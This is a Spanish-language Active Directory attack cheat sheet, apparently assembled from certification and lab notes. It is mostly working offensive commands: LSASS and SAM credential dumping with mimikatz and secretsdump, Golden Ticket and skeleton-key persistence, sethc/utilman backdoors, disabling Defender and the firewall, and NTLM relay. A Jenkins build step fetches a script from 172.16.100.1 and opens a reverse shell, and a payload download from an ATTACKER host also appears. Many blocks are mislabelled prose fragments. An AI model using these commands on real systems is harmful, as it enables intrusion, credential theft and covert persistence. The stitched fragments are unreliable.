#### ⚡ Método rápido — NetExec módulo ntdsutil
```bash
netexec smb 10.129.201.57 -u bwilliamson -p P@55w0rd! -M ntdsutil
```

#### Command execution
```bash
LSADUMP::LSA:
```

#### Command execution
```bash
LSADUMP::SAM:
```

#### Command execution
```bash
LSADUMP::Secrets:
```

#### Command execution
```bash
LSADUMP::SetNTLM:
```

#### Command execution
```bash
LSADUMP::Trust:
```

#### Command execution
```bash
Una vez conectados, iniciamos una sesión de PowerShell como Administrador. Desde este símbolo del sistema, podemos comenzar Mimikatz y entrar privilegio::depuración para involucrar al SeDebugPrivlege privilegio, que nos permitirá interactuar con un proceso propiedad de Otra cuenta.
```

#### Command execution
```bash
Una vez que hayamos ejecutado el listado de directorios en el recurso compartido SMB, podemos Utilice Mimikatz para mostrar los tickets que están almacenados en la memoria ingresando sekurlsa::entradas.
```

#### Command execution
```bash
Mimikatz también puede exportar tickets al disco duro e importarlos en LSASS, que exploraremos más adelante.
```

#### Command execution
```bash
Podemos confiar nuevamente en Mimikatz para lograr esto. El cripto El módulo contiene la capacidad de parchear el CriptoAPI función con cripto::capi o ClaveIso servicio con cripto::cng,haciendo claves no exportables exportables.
```

#### Command execution
```bash
Podemos validar esto abriendo un shell administrativo y usando mimikatz con el comando sekurlsa::logonpasswords. El volcará los hashes de contraseña almacenados en caché.
```

#### Command execution
```bash
secretsdump.py -sam sam.save -system system.save LOCAL
```

#### Command execution
```bash
secretsdump.py -ntds NTDS.dit -system SYSTEM LOCAL
```

#### Command execution
```bash
.\mimikatz.exe
```

#### Command execution
```bash
python3 secretsdump.py -sam SAM -system SYSTEM LOCAL
```

#### Command execution
```bash
python3 secretsdump.py -sam SAM -system SYSTEM -security SECURITY LOCAL
```

#### Command execution
```bash
secretsdump.py -k -no-pass DC01.domain.local
```

#### Extrae passwords en texto claro, hashes NTLM y tickets Kerberos de la memoria LSASS. Requiere privilegios de administrador y SeDebugPrivilege.
```bash
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
```

#### Invoke-Mimikatz es uno de los scripts PowerShell mas firmados. En CRTP se menciona como caso especial: requiere multiples pasos y no debe tratarse como un simple cambio de cadena.
```bash
Get-ChildItem C:\AD\Tools\Invoke-Mimikatz.ps1
```

#### Solo para laboratorio autorizado: comprueba cuantas zonas se detectan. Si aparecen muchas detecciones, no lo metas en el mismo flujo simple de PowerUp.
```bash
DefenderCheck.exe C:\AD\Tools\Invoke-Mimikatz.ps1
```

#### LSASS es el proceso del servicio LSA y almacena material sensible como hashes, claves AES y tickets. Tambien es uno de los procesos mas monitorizados.
```bash
tasklist /fi "imagename eq lsass.exe"
```

#### SAM hive: credenciales locales. Requiere privilegios y debe tratarse como material sensible.
```bash
reg query HKLM\SAM
```

#### SECURITY/LSA Secrets: secretos de servicios, cached creds y otros datos. No toca LSASS directamente, pero sigue siendo de alto impacto.
```bash
reg query HKLM\SECURITY
```

#### Credential Manager/Vault: ejemplo de credenciales protegidas por DPAPI. Sirve para recordar que no todo esta en LSASS.
```bash
cmdkey /list
```

#### Insecure storage: shares, ficheros, history y configs pueden ser fuentes de credenciales sin tocar LSASS.
```bash
dir /s /b *password* *cred* *config* 2>nul
```

#### Extrae claves de sesiones desde LSASS. Alto impacto, muy firmado y monitorizado; usar solo en lab autorizado.
```bash
mimikatz.exe -Command "sekurlsa::ekeys"
```

#### SafetyKatz usa minidump de LSASS y PE loader para ejecutar funcionalidad tipo Mimikatz. Sigue siendo sensible y detectable.
```bash
SafetyKatz.exe "sekurlsa::ekeys"
```

#### Analisis offline de minidump desde Linux/Windows. Reduce ejecucion en target, pero el dump de LSASS es material critico.
```bash
pypykatz lsa minidump lsass.dmp
```

#### Ejemplo de dump LSASS en lab. Muy monitorizado; evita en real salvo autorizacion explicita.
```bash
procdump64.exe -ma lsass.exe lsass.dmp
```

#### Ejecutar SafetyKatz en `dcorp-mgmt` - Copy Loader.exe to dcorp-mgmt
```bash
$null | winrs -r:dcorp-mgmt "netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=172.16.100.81"
```

#### Inyecta skeleton key en un DC. Requiere DA y tocar LSASS; usar solo en lab/autorizado.
```bash
SafetyKatz.exe "privilege::debug" "misc::skeleton" -ComputerName dcorp-dc.dollarcorp.moneycorp.local
```

#### Si LSASS esta protegido, requiere driver en kernel. Muy ruidoso: instalacion de servicio/driver.
```bash
mimikatz # privilege::debug; !+; !processprotect /process:lsass.exe /remove; misc::skeleton; !-
```

#### Dump del hash DSRM/SAM en DC. Requiere privilegios altos.
```bash
SafetyKatz.exe "token::elevate" "lsadump::sam"
```

#### Ejecuta la extraccion DSRM desde la sesion privilegiada en dcorp-dc.
```bash
execute-assembly -p taskhostw.exe -t 180 /mnt/c/AD/Tools/Sliver/mimikatz-dsrm.exe.packed.dotnet.exe
```

#### Inyeccion en memoria de SSP. Menos persistente y no siempre estable en Server 2019/2022.
```bash
SafetyKatz.exe -Command "misc::memssp"
```

#### Transferencia de herramientas y ejecucion - Copy minidumpdotnet.dll, mini.ps1 and reverse.exe tools in the share
```bash
copy C:\AD\Tools\minidumpdotnet.dll \\dcorp-std481\studentshare481
```

#### Transferencia de herramientas y ejecucion - Copy minidumpdotnet.dll, mini.ps1 and reverse.exe tools in the share
```bash
copy C:\AD\Tools\mini.ps1 \\dcorp-std481\studentshare481
```

#### Transferencia de herramientas y ejecucion - Copy minidumpdotnet.dll, mini.ps1 and reverse.exe tools in the share
```bash
copy C:\AD\Tools\reverse.exe \\dcorp-std481\studentshare481
```

#### Procesar minidump localmente
```bash
C:\AD\Tools\studentshare481\Reverse.exe "C:\AD\Tools\studentshare481\reverse.dmp" "C:\AD\Tools\studentshare481\reverse481.dmp"
```

#### Procesar minidump localmente - Parse the exfiltrated minidump using minikatz from an elevated shell. Procesa minidump o extrae material sensible segun el contexto del lab.
```bash
C:\AD\Tools\mimikatz.exe "sekurlsa::minidump C:\AD\Tools\studentshare481\reverse481.dmp" "sekurlsa::ekeys" "exit"
```

#### Using PSRemoting
```bash
Enter-PSSession -ComputerName dcorp-adminsrv.dollarcorp.moneycorp.local
```

#### Abuse Jenkins Instance - Open a project, go to build steps and add the below command
```bash
powershell.exe iex (iwr http://172.16.100.1/Invoke-PowerShellTcp.ps1 -UseBasicParsing);Power -Reverse -IPAddress 172.16.100.1 -Port 443
```

#### Abuse Jenkins Instance - Start a listener
```bash
ipconfig
```

#### Abuse Jenkins Instance - Start a listener
```bash
$env:computername
```

---

## 10 — Domain Dominance & Persistence (DCSync, Golden & Silver Tickets, Skeleton Key)

#### Realizar un ataque DCSync para recuperar hashes de contraseña NTLM
```bash
DCSync
```

#### `Silver Ticket`
```bash
Pass-the-Ticket
```

#### Windows Backdoors & Persistence CheatSheet (Formato C) / Habilitar opciones avanzadas y xp cmdshell: Cambia opciones de configuración del servidor SQL.
```bash
sp_configure 'Show Advanced Options', 1;
```

#### Windows Backdoors & Persistence CheatSheet (Formato C) / Habilitar opciones avanzadas y xp cmdshell: Cambia opciones de configuración del servidor SQL.
```bash
sp_configure 'xp_cmdshell', 1;
```

#### Windows Backdoors & Persistence CheatSheet (Formato C) / Conceder privilegios de impersonación: Concede permisos o privilegios al principal indicado.
```bash
GRANT IMPERSONATE ON LOGIN::sa TO [Public];
```

#### Windows Backdoors & Persistence CheatSheet (Formato C) / Reverse shell en PowerShell: Encadena comandos o filtra resultados para obtener información más útil.
```bash
[byte[]]$bytes = 0..65535|%{0};
```

#### Windows Backdoors & Persistence CheatSheet (Formato C): Ejecuta un script o binario auxiliar.
```bash
C:\Windows\system32\NOTEPAD.EXE $args[0]
```

#### Windows Backdoors & Persistence CheatSheet (Formato C)
```bash
Subir psexesvc.exe
```

#### Windows Backdoors & Persistence CheatSheet (Formato C) / Crear: Enumera, inspecciona o ejecuta tareas programadas.
```bash
schtasks /s TARGET /RU "SYSTEM" /create /tn "THMtask1" /tr "<command>" /sc ONCE /sd 01/01/1970 /st 00:00
```

#### Windows Backdoors & Persistence CheatSheet (Formato C) / Ejecutar: Enumera, inspecciona o ejecuta tareas programadas.
```bash
schtasks /s TARGET /run /TN "THMtask1"
```

#### Windows Backdoors & Persistence CheatSheet (Formato C) / Eliminar: Enumera, inspecciona o ejecuta tareas programadas.
```bash
schtasks /S TARGET /TN "THMtask1" /DELETE /F
```

#### Ejemplo de persistencia colocando un payload en Startup: Copia o mueve archivos para preparar o alterar el flujo de trabajo.
```bash
copy revshell.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\"
```

#### Crear un payload y colocarlo en C:\Windows: Copia o mueve archivos para preparar o alterar el flujo de trabajo.
```bash
move revshell.exe C:\Windows
```

#### Ruta de Winlogon
```bash
HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Winlogon
```

#### Descarga de payload: Descarga contenido o ficheros desde una URL.
```bash
wget http://ATTACKER/payload.exe -O payload.exe
```

#### Movimiento y copia: Copia o mueve archivos para preparar o alterar el flujo de trabajo.
```bash
move payload.exe C:\Windows
```

#### Movimiento y copia: Copia o mueve archivos para preparar o alterar el flujo de trabajo.
```bash
copy payload.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\"
```

#### Reemplazo de sethc.exe: Toma posesión de un archivo o recurso protegido.
```bash
takeown /f C:\Windows\System32\sethc.exe
```

#### Reemplazo de sethc.exe: Copia o mueve archivos para preparar o alterar el flujo de trabajo.
```bash
copy C:\Windows\System32\cmd.exe C:\Windows\System32\sethc.exe
```

#### Reemplazo de Utilman: Toma posesión de un archivo o recurso protegido.
```bash
takeown /f C:\Windows\System32\utilman.exe
```

#### Reemplazo de Utilman: Copia o mueve archivos para preparar o alterar el flujo de trabajo.
```bash
copy C:\Windows\System32\cmd.exe C:\Windows\System32\utilman.exe
```

#### Mover al root de IIS: Copia o mueve archivos para preparar o alterar el flujo de trabajo.
```bash
move cmdasp.aspx C:\inetpub\wwwroot
```

#### Copiar persistencia hijack: Copia o mueve archivos para preparar o alterar el flujo de trabajo.
```bash
copy <payload> C:\Windows
```

#### Genera un Golden Ticket desde Linux con Impacket. Crea un archivo .ccache que se usa con KRB5CCNAME para autenticarse como Domain Admin.
```bash
impacket-ticketer -nthash <KRBTGT_HASH> -domain-sid <SID> -domain domain.local administrator
```

#### Clave AES256 de krbtgt. Firma/cifra el TGT; usar AES suele parecer mas normal que RC4.
```bash
/aes256:<krbtgt_aes256>
```

#### Cadena mental: primero secretos del DC, luego forja de TGT, despues acceso como DA.
```bash
Learning Objective 8 -> DCSync krbtgt -> Golden Ticket -> usar DA de nuevo
```

#### Extraer hashes del Domain Controller - In the new process
```bash
netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=172.16.100.2
```

#### HTTP Service - Check if the correct service ticket was obtained. Comando Kerberos con Rubeus dentro del flujo CRTP.
```bash
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args klist
```

#### HTTP Service - Access using winrs
```bash
winrs -r:dcorp-dc.dollarcorp.moneycorp.local cmd
```

#### Se usa despues de DA/krbtgt AES. Es persistencia Kerberos con mejor apariencia temporal.
```bash
Learning Objective 10 -> usar DA obtenido antes para ejecutar Diamond Ticket
```

#### Persistencia por SSP en registro. Requiere escribir DLL/registro y suele requerir reinicio o recarga.
```bash
$packages = Get-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\OSConfig\ -Name 'Security Packages' | select -ExpandProperty 'Security Packages'; $packages += 'mimilib'; Set-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\OSConfig\ -Name 'Security Packages' -Value $packages; Set-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\ -Name 'Security Packages' -Value $packages
```

---

## 11 — Advanced Active Directory Tooling & Operations

#### Busqueda rapida local en Windows de secretos en archivos comunes.
```bash
findstr /S /I password *.txt *.xml *.ini *.config
```

#### 🏢 FUNDAMENTOS ACTIVE DIRECTORY
```bash
Get-Service -Name WinDefend
```

#### 🏢 FUNDAMENTOS ACTIVE DIRECTORY
```bash
Get-MpComputerStatus | Select-Object AMRunningStatus,AMServiceEnabled,AntivirusEnabled,AntispywareEnabled,RealTimeProtectionEnabled
```

#### 🏢 FUNDAMENTOS ACTIVE DIRECTORY
```bash
Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False
```

#### 🏢 FUNDAMENTOS ACTIVE DIRECTORY
```bash
Get-NetFirewallRule
```

#### 🏢 FUNDAMENTOS ACTIVE DIRECTORY
```bash
Test-NetConnection -ComputerName <IP or Hostname> -Port <PortNumber>
```

#### 🔷 Conexión RDP utilizando Hash NTLM (Pass-The-Hash RDP)
```bash
reg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa /v DisableRestrictedAdmin /d 0 /t REG_DWORD
```

#### 🔷 Conexión RDP utilizando Hash NTLM (Pass-The-Hash RDP)
```bash
reg delete HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa /v DisableRestrictedAdmin /f
```

#### 🎯 PENTESTING ACTIVE DIRECTORY - GUÍA COMPLETA
```bash
sudo nmap -p- -Pn -sS -n -vvv --min-rate 5000 192.168.1.1 -oG all_ports
```

#### 🎯 PENTESTING ACTIVE DIRECTORY - GUÍA COMPLETA
```bash
nmap --script=smb* -p 445,139 192.168.1.1 -oN smb_scan
```

#### 🎯 PENTESTING ACTIVE DIRECTORY - GUÍA COMPLETA
```bash
nmap --script=rdp* -p 3389 192.168.1.1 -oN rdp_scan
```

#### 🎯 PENTESTING ACTIVE DIRECTORY - GUÍA COMPLETA
```bash
nmap --script=kerberos* -p 88 192.168.1.1 -oN kerberos_scan
```

#### 🎯 PENTESTING ACTIVE DIRECTORY - GUÍA COMPLETA
```bash
crackmapexec smb 192.168.1.0/24 -u "" -p "" --shares
```

#### 🎯 PENTESTING ACTIVE DIRECTORY - GUÍA COMPLETA
```bash
crackmapexec smb 192.168.1.1 -u "guest" -p "" --pass-pol
```

#### 🎯 PENTESTING ACTIVE DIRECTORY - GUÍA COMPLETA
```bash
crackmapexec smb 192.168.1.0/24 -u administrator -p 'Password123!' --shares
```

#### 🎯 PENTESTING ACTIVE DIRECTORY - GUÍA COMPLETA
```bash
crackmapexec smb 192.168.56.10 --pass-pol
```

#### 🎯 PENTESTING ACTIVE DIRECTORY - GUÍA COMPLETA
```bash
enum4linux -a 192.168.1.1
```

#### 🎯 PENTESTING ACTIVE DIRECTORY - GUÍA COMPLETA
```bash
enum4linux -S 192.168.1.1 # Solo shares
```

#### 🎯 PENTESTING ACTIVE DIRECTORY - GUÍA COMPLETA
```bash
sudo responder -I eth0 -wrf
```

#### 🎯 PENTESTING ACTIVE DIRECTORY - GUÍA COMPLETA
```bash
crackmapexec smb 192.168.1.0/24 --gen-relay-list relay.txt
```

#### 🎯 PENTESTING ACTIVE DIRECTORY - GUÍA COMPLETA
```bash
impacket-ntlmrelayx -tf relay.txt -socks -smb2support -debug
```

#### 🎯 PENTESTING ACTIVE DIRECTORY - GUÍA COMPLETA
```bash
impacket-ntlmrelayx -tf relay.txt -c "ipconfig" -smb2support
```

#### 🎯 PENTESTING ACTIVE DIRECTORY - GUÍA COMPLETA
```bash
sudo mitm6 -i eth0 -d domain.local --debug
```

#### 🎯 PENTESTING ACTIVE DIRECTORY - GUÍA COMPLETA
```bash
crackmapexec smb 192.168.1.1 -u admin -p password -x 'whoami'
```

#### 🎯 PENTESTING ACTIVE DIRECTORY - GUÍA COMPLETA
```bash
crackmapexec smb 192.168.1.1 -u admin -p password -X 'ipconfig'
```

#### 🎯 PENTESTING ACTIVE DIRECTORY - GUÍA COMPLETA
```bash
crackmapexec smb -L
```

#### 🎯 PENTESTING ACTIVE DIRECTORY - GUÍA COMPLETA
```bash
crackmapexec smb 192.168.1.1 -u admin -p password -M powerview
```

#### 🎯 PENTESTING ACTIVE DIRECTORY - GUÍA COMPLETA
```bash
crackmapexec smb 192.168.1.1 -u admin -p password -M met_inject -o LHOST=192.168.1.100 LPORT=4444
```

#### 🎯 PENTESTING ACTIVE DIRECTORY - GUÍA COMPLETA
```bash
msfconsole -q
```

#### 🎯 PENTESTING ACTIVE DIRECTORY - GUÍA COMPLETA
```bash
use exploit/multi/handler
```

#### 🎯 PENTESTING ACTIVE DIRECTORY - GUÍA COMPLETA
```bash
set payload windows/meterpreter/reverse_https
```

#### 🎯 PENTESTING ACTIVE DIRECTORY - GUÍA COMPLETA
```bash
set LHOST 192.168.1.100
```

#### 🎯 PENTESTING ACTIVE DIRECTORY - GUÍA COMPLETA
```bash
set LPORT 4444
```

#### 🎯 PENTESTING ACTIVE DIRECTORY - GUÍA COMPLETA
```bash
set ExitOnSession false
```

#### 🎯 PENTESTING ACTIVE DIRECTORY - GUÍA COMPLETA
```bash
exploit -j
```

#### 🎯 PENTESTING ACTIVE DIRECTORY - GUÍA COMPLETA
```bash
listeners
```

#### 🎯 PENTESTING ACTIVE DIRECTORY - GUÍA COMPLETA
```bash
set Name http
```

#### 🎯 PENTESTING ACTIVE DIRECTORY - GUÍA COMPLETA
```bash
set Host 192.168.1.100
```

#### 🎯 PENTESTING ACTIVE DIRECTORY - GUÍA COMPLETA
```bash
set Port 8080
```

#### 🎯 PENTESTING ACTIVE DIRECTORY - GUÍA COMPLETA
```bash
execute
```

#### 🎯 PENTESTING ACTIVE DIRECTORY - GUÍA COMPLETA
```bash
usestager multi/launcher
```

#### 🎯 PENTESTING ACTIVE DIRECTORY - GUÍA COMPLETA
```bash
set Listener http
```

#### 🎯 PENTESTING ACTIVE DIRECTORY - GUÍA COMPLETA
```bash
crackmapexec smb 192.168.1.0/24 -u administrator -H aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c
```

#### 🎯 PENTESTING ACTIVE DIRECTORY - GUÍA COMPLETA
```bash
powershell -c "Set-MpPreference -DisableRealtimeMonitoring $true"
```

#### 🟦 SMB / PYME – Comandos Importantes
```bash
enum4linux-ng -A 10.129.14.128
```

#### 🟦 SMB / PYME – Comandos Importantes
```bash
enum4linux -a 10.129.14.128
```

#### 🟦 SMB / PYME – Comandos Importantes
```bash
smbclient -L //10.129.14.128 -N
```

#### 🟦 SMB / PYME – Comandos Importantes
```bash
crackmapexec smb 10.129.14.128
```

#### 🟦 SMB / PYME – Comandos Importantes
```bash
crackmapexec smb 10.129.14.128 --rid-brute
```

#### 🟦 SMB / PYME – Comandos Importantes
```bash
sudo nmap --script smb-vuln* -p445 10.129.14.128
```

#### 🟦 SMB / PYME – Comandos Importantes
```bash
sudo nmap --script smb-enum-domains -p445 10.129.14.128
```

#### 🟦 SMB / PYME – Comandos Importantes
```bash
sudo nmap --script smb-vuln-ms17-010 -p445 10.129.14.128
```

#### 🟦 SMB / PYME – Comandos Importantes
```bash
nmap --script smb-vuln-ms17-010 -p445 10.129.14.128
```

#### 🟦 SMB / PYME – Comandos Importantes
```bash
use exploit/windows/smb/ms17_010_eternalblue
```

#### 🟦 SMB / PYME – Comandos Importantes
```bash
smbclient -N -L //10.129.14.128
```

#### 🟦 SMB / PYME – Comandos Importantes
```bash
rpcclient -U "" 10.129.14.128
```

#### 🟦 SMB / PYME – Comandos Importantes
```bash
smbmap -H 10.129.14.128
```

#### 🟦 SMB / PYME – Comandos Importantes
```bash
crackmapexec smb 10.129.14.128 --gen-relay-list relay_hosts.txt
```

#### Lista los tickets de autenticación del archivo krb5.keytab
```bash
klist -k krb5.keytab
```

#### Inicia la consola interactiva de kadmin con el archivo keytab y el principal de administrador
```bash
kadmin -kt /etc/krb5.keytab -p kadmin/admin@REALCORP.HTB
```

#### Guarda la configuración del registro de sistema en un archivo
```bash
reg save HKLM\system system
```

#### Detiene el servicio mysql
```bash
net stop mysql
```

#### Inicia el servicio mysql
```bash
net start mysql
```

#### Obtener el SID de la cuenta de máquina NameFakeComputer
```bash
Get-DomainComputer NameFakeComputer | select -expand objectsid
```

#### Crear un descriptor de seguridad con permisos específicos
```bash
New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($fakesid))"
```

#### Establecer el atributo msds-allowedtoactonbehalfofotheridentity en la cuenta de máquina objetivo
```bash
Get-DomainComputer $TargetComputer | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}
```

#### Crear un descriptor de seguridad a partir de los bytes obtenidos
```bash
New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $RawBytes, 0
```

#### Subir el script PowerView.ps1
```bash
upload PowerView.ps1
```

#### Convertir una cadena de texto a una contraseña segura
```bash
$pass = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
```

#### Convierte una cadena de texto a un objeto SecureString para utilizar como contraseña
```bash
ConvertTo-SecureString 'W3_4R3_th3_f0rce.' -AsPlainText -Force
```

#### Ejecuta un comando en un equipo remoto utilizando credenciales especificadas y devuelve la salida
```bash
Invoke-Command -Computer localhost -Credential $cred -ScriptBlock {whoami}
```

#### Interprete de Python
```bash
python
```

#### Nombre de la función hash criptográfica
```bash
ntlm
```

#### Cuenta de servicio utilizada para cifrar TGT
```bash
krbtgt
```

#### Solicitud de aplicación enviada por el cliente al servidor de aplicaciones
```bash
ap req
```

#### Crear un objeto TCPClient para establecer una conexión con la máquina atacante
```bash
New-Object System.Net.Sockets.TCPClient("192.168.118.2",443);
```

#### Crear un objeto ASCIIEncoding para codificar la data
```bash
New-Object System.Text.ASCIIEncoding;
```

#### Convertir la contraseña a un objeto seguro
```bash
ConvertTo-SecureString $password -AsPlaintext -Force;
```

#### Framework de pruebas de penetración y explotación de vulnerabilidades
```bash
Metasploit
```

#### Cambia el directorio actual a Documents
```bash
cd ~\Documents
```

#### Inicia el servidor Neo4j con la base de datos activa
```bash
neo4j console startActive database: graph.db
```

#### Aceptar los cambios en la configuración de Active Directory
```bash
Aceptar
```

#### Abrir la ventana de funciones avanzadas
```bash
Ver > Funciones avanzadas
```

#### Buscar un objeto en Active Directory
```bash
Buscar
```

#### Ver la lista de servidores en Active Directory
```bash
Servidores
```

#### Ver la lista de estaciones de trabajo en Active Directory
```bash
Estaciones de trabajo
```

#### Buscar hosts en Active Directory
```bash
Buscar hosts
```

#### Abrir la ventana de Runas
```bash
Runas
```

#### Abrir la consola de administración de Microsoft con Runas
```bash
MMC
```

#### Enumerar información de un host utilizando el protocolo SMB
```bash
enum4linux
```

#### Extraer tickets TGT de Kerberos y realizar ataques de pass-the-ticket
```bash
Rubeus
```

#### Realizar ataques de rociado de contraseñas y extraer información de un host
```bash
Responder
```

#### Realizar consultas y enumeraciones en un host de Windows utilizando DNS
```bash
DNS
```

#### Realizar consultas y enumeraciones en un host de Windows utilizando Sysinternals
```bash
Sysinternals
```

#### Realizar consultas y enumeraciones en un host de Windows utilizando PowerShell
```bash
PowerShell
```

#### Herramienta de PowerShell para manipular tickets de Kerberos
```bash
Rubeus.exe
```

#### Escribir en cualquier atributo no protegido de un objeto
```bash
Set-DomainObject
```

#### No se especifica la descripción
```bash
Unexpire-Password
```

#### No se especifica la descripción
```bash
Reanimate-Tombstones
```

#### Herramienta de análisis de Active Directory
```bash
PowerView
```

#### Muestra el contenido del archivo flag.txt
```bash
type  \academy-ea-dc01.inlanefreight.local\c$\ExtraSids\flag.txt
```

#### Herramienta para explorar y editar Active Directory
```bash
AD Explorer
```

#### Ejecutar PingCastle en modo interactivo
```bash
PingCastle.exe --interactive
```

#### Generar un archivo de registro de PingCastle
```bash
PingCastle.exe --log
```

#### Agregar registro a la consola de PingCastle
```bash
PingCastle.exe --log-console
```

#### Especificar el servidor a utilizar en PingCastle
```bash
PingCastle.exe --server <server>
```

#### Especificar el puerto a utilizar en PingCastle
```bash
PingCastle.exe --port <port>
```

#### Especificar la contraseña a utilizar en PingCastle
```bash
PingCastle.exe --password <pass>
```

#### Especificar el protocolo a utilizar en PingCastle
```bash
PingCastle.exe --protocol <proto>
```

#### 🩸
```bash
npm install
```

#### 🩸
```bash
npm run electron
```

#### 🩸
```bash
-hashes           # Hash NTLM (formato LM:NT)
```

#### 🩸
```bash
-k, --kerberos    # Usar autenticación Kerberos
```

#### 🩸
```bash
-zip              # Archivo ZIP de salida
```

#### Descripción
```bash
Cuenta
```

#### 🎯
```bash
C:\Windows\System32\spool\drivers\color
```

#### 🎯
```bash
C:\Windows\Tasks
```

#### 🎯
```bash
C:\Windows\Temp
```

#### 🟦
```bash
mask ""
```

#### 🟦
```bash
recurse ON
```

#### 🟦
```bash
prompt OFF
```

#### 🟦
```bash
mget *
```

#### 🟦
```bash
srvinfo
```

#### 🟦
```bash
enumdomains
```

#### 🟦
```bash
querydominfo
```

#### 🟦
```bash
netshareenumall
```

#### 🟦
```bash
netsharegetinfo notes
```

#### 🟦
```bash
smbstatus
```

#### 🔐
```bash
privilege::debug
```

#### 🔐
```bash
sekurlsa::logonpasswords
```

#### 🔐
```bash
event::drop
```

#### 🔐
```bash
kerberos::golden /domain:child.example.com /target:parent.example.com
```

#### 🔐
```bash
/sid:S-1-5-21-111-222-333 /sids:S-1-5-21-999-888-777-519
```

#### 🔐
```bash
kerberos::list
```

#### 🔐
```bash
kerberos::purge
```

#### 🔐
```bash
kerberos::ptc /ticket:ticket.kirbi
```

#### 🔐
```bash
sekurlsa::tickets /export
```

#### 🔐
```bash
privilege::backup
```

#### 🔐
```bash
token::elevate /domainadmin
```

#### 🔐
```bash
ts::multirdp
```

#### 🔐
```bash
vault::cred /patch
```

#### Command execution
```bash
External Recon
```

#### Command execution
```bash
Internal Recon
```

#### Command execution
```bash
Poisoning
```

#### Command execution
```bash
Password Spraying
```

#### Command execution
```bash
Credentialed Enumeration
```

#### N/A
```bash
LOTL
```

#### 🔐 Crear PSCredential para MSSQLADM
```bash
PS C:\DotNetNuke\Portals\0> $SecPassword = ConvertTo-SecureString 'DBAilfreight1!' -AsPlainText -Force
```

#### 🔐 Crear PSCredential para MSSQLADM
```bash
PS C:\DotNetNuke\Portals\0> $Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\mssqladm', $SecPassword)
```

#### 🔐 PSCredential para TTIMMONS
```bash
PS C:\DotNetNuke\Portals\0> $timpass = ConvertTo-SecureString '<PASSWORD REDACTED>' -AsPlainText -Force
```

#### 🔐 PSCredential para TTIMMONS
```bash
PS C:\DotNetNuke\Portals\0> $timcreds = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\ttimmons', $timpass)
```

#### 🔨 Bruteforce AD con NetExec (SMB)
```bash
netexec smb 10.129.201.57 -u bwilliamson -p /usr/share/wordlists/fasttrack.txt
```

#### 🔨 Bruteforce AD con NetExec (SMB)
```bash
[+] inlanefrieght.local\bwilliamson:P@55w0rd!
```

#### 🚚 Transferencia a tu máquina (SMB server)
```bash
smbserver.py -smb2support CompData /home/bob/Documents/
```

#### Monta una copia sombra del volumen C: en la letra Z: sin bloquear escritores
```bash
diskshadow.exe /s c:\Temp\test.txt
```

#### Sube Rubeus para ataques de Kerberos
```bash
upload Rubeus.exe
```

#### Obtiene el SID de la máquina falsa creada
```bash
$fakesid = Get-DomainComputer NameFakeComputer | select -expand objectsid
```

#### Convierte la nueva contraseña a formato seguro para usar en cmdlets de AD
```bash
$newpass = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
```

#### Define la variable de entorno con el ticket Kerberos del administrador para que herramientas de Impacket lo usen
```bash
export KRB5CCNAME=administrator.ccache
```

#### Convierte la contraseña en un objeto SecureString para uso en credenciales de PowerShell
```bash
$passwd = ConvertTo-SecureString 'W3_4R3_th3_f0rce.' -AsPlainText -Force
```

#### Reconfigura Kerberos para solucionar error gssapi-with-mic en SSH
```bash
dpkg-reconfigure krb5-config
```

#### Command execution
```bash
Modificar el registro:
```

#### Command execution
```bash
Comando: event::drop
```

#### Command execution
```bash
Comando: kerberos::golden
```

#### Command execution
```bash
Listar tickets:
```

#### Command execution
```bash
Pasar la caché:
```

#### Command execution
```bash
Pasar el ticket:
```

#### Command execution
```bash
Limpiar tickets:
```

#### Command execution
```bash
MISC::Skeleton:
```

#### Command execution
```bash
PRIVILEGE::Backup:
```

#### Command execution
```bash
PRIVILEGE::Debug:
```

#### Command execution
```bash
SEKURLSA::LogonPasswords:
```

#### Command execution
```bash
SEKURLSA::Tickets:
```

#### Command execution
```bash
SID::add/modify:
```

#### Command execution
```bash
TOKEN::Elevate:
```

#### Command execution
```bash
TS::MultiRDP:
```

#### Command execution
```bash
Técnica 2: Herramientas automáticas
```

#### Command execution
```bash
Automate OffSec, EASM, and Custom Security Processes | Trickest
```

#### Command execution
```bash
GhostPack/Rubeus de PR #139:
```

#### Command execution
```bash
Advertencia
```

#### Command execution
```bash
Algunos de los laboratorios requieren que lo hagas inicie la máquina objetivo(s) abajo.
```

#### Command execution
```bash
Laboratorios
```

#### Command execution
```bash
R: domain controller
```

#### Command execution
```bash
R: OS{02b12bc4f9f5a355cc4de16988ba0e5d}
```

#### Command execution
```bash
Para ejecutar el script, debemos omitir la política de ejecución, que fue diseñado para evitar que ejecutáramos accidentalmente scripts de PowerShell. Haremos esto con bypass powershell -ep:
```

#### Command execution
```bash
Ejecutemos el guión.
```

#### Command execution
```bash
R: PdcRoleOwner
```

#### Command execution
```bash
R: adsi
```

#### Command execution
```bash
El DirectorioSearcher listas de documentación BuscarTodos(), que devuelve una colección de todas las entradas encontradas en AD.
```

#### Command execution
```bash
Ejecutemos el guión:
```

#### Command execution
```bash
Además, net.exe no puede mostrar atributos específicos. Esto enfatiza el beneficio de las herramientas personalizadas.
```

#### Command execution
```bash
R: OS{b3229c11df1181f6209330efceff2616}
```

#### Command execution
```bash
